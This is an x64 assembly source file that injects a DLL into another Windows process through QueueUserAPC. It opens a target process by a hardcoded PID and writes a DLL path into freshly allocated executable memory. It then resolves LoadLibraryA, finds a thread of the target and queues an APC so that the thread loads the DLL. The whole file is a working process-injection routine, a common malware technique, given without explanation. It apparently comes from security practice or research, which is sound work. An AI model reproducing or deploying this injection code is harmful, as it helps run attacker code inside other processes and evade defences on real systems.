; windows_injection_queueuserapc.asm

extrn ExitProcess :PROC
extrn OpenProcess :PROC
extrn VirtualAllocEx :PROC
extrn WriteProcessMemory :PROC
extrn GetModuleHandleA :PROC
extrn GetProcAddress :PROC
extrn CreateToolhelp32Snapshot :PROC
extrn Thread32First :PROC
extrn Thread32Next :PROC
extrn OpenThread :PROC
extrn QueueUserAPC :PROC

_THREADENTRY32 STRUCT
    dwSize              DD ?
    cntUsage            DD ?
    th32ThreadID        DD ?
    th32OwnerProcessID  DD ?
    tpBasePri           DD ?
    tpDeltaPri          DD ?
    dwFlags             DD ?
_THREADENTRY32 ENDS

.data
    dllPath                     DB "C:\Users\User\Desktop\test.dll", 0
    sKrnl32                     DB "kernel32.dll", 0
    sLoadLib                    DB "LoadLibraryA", 0
    PID                         DQ 6300

    te32                        _THREADENTRY32 <>
    te32size                    DD SIZEOF te32
    hProcess                    DQ ?
    hThread                     DQ ?
    baseAddr                    DQ ?
    hSnapshot                   DQ ?
    TID                         DD ?
    hKrnl32Addr                 DQ ?
    hLoadLibAddr                DQ ?

.code
Start PROC
    SUB     rsp, 28h

    ; OpenProcess()
    MOV     rcx, 1F0FFFh
    XOR     rdx, rdx
    MOV     r8, PID
    CALL    OpenProcess
    CMP     rax, 0
    JZ      _exit
    MOV     hProcess, rax

    ; VirtualAllocEx()
    SUB     rsp, 28h
    MOV     rcx, hProcess
    XOR     rdx, rdx
    MOV     r8, SIZEOF dllPath
    MOV     r9, 3000h
    MOV     qword ptr [rsp+32], 40h
    CALL    VirtualAllocEx
    ADD     rsp, 28h
    CMP     rax, 0
    JZ      _exit
    MOV     baseAddr, rax

    ; WriteProcessMemory()
    SUB     rsp, 28h
    MOV     rcx, hProcess
    MOV     rdx, baseAddr
    LEA     r8, dllPath
    MOV     r9, SIZEOF dllPath
    XOR     rax, rax
    MOV     qword ptr [rsp+32], rax
    CALL    WriteProcessMemory
    ADD     rsp, 28h
    CMP     rax, 0
    JZ      _exit

    ; GetModuleHandle()
    LEA     rcx, sKrnl32
    CALL    GetModuleHandleA
    CMP     rax, 0
    JZ      _exit
    MOV     hKrnl32Addr, rax

    ; GetProcAddress()
    MOV     rcx, hKrnl32Addr
    LEA     rdx, sLoadLib
    CALL    GetProcAddress
    CMP     rax, 0
    JZ      _exit
    MOV     hLoadLibAddr, rax

    ; Snapshot of process to get threads
    MOV     rcx, 4
    MOV     rdx, PID
    CALL    CreateToolhelp32Snapshot
    MOV     hSnapshot, rax

    ; Get the first thread in the snapshot
    MOV     rcx, hSnapshot
    LEA     rdx, te32
    MOV     eax, te32size
    MOV     te32.dwSize, eax
    CALL    Thread32First

    ; Compare the PID owner of the thread with the PID of the process to inject
_loop_to_find_thread:
    MOV     rbx, PID
    CMP     te32.th32OwnerProcessID, ebx
    JZ      _thread_found
    MOV     rcx, hSnapshot
    LEA     rdx, te32
    MOV     eax, te32size
    MOV     te32.dwSize, eax
    CALL    Thread32Next
    JMP     _loop_to_find_thread

_thread_found:
    MOV     eax, te32.th32ThreadID
    MOV     TID, eax

    ; OpenThread()
    MOV     rcx, 10h
    XOR     rdx, rdx
    XOR     rax, rax
    MOV     eax, TID
    MOV     r8, rax
    CALL    OpenThread
    CMP     rax, 0
    JZ      _exit
    MOV     hThread, rax

    ; QueueUserAPC()
    MOV     rcx, hLoadLibAddr
    MOV     rdx, hThread
    MOV     r8, baseAddr
    CALL    QueueUserAPC

_exit:
    XOR     rcx, rcx
    CALL    ExitProcess
Start ENDP

END

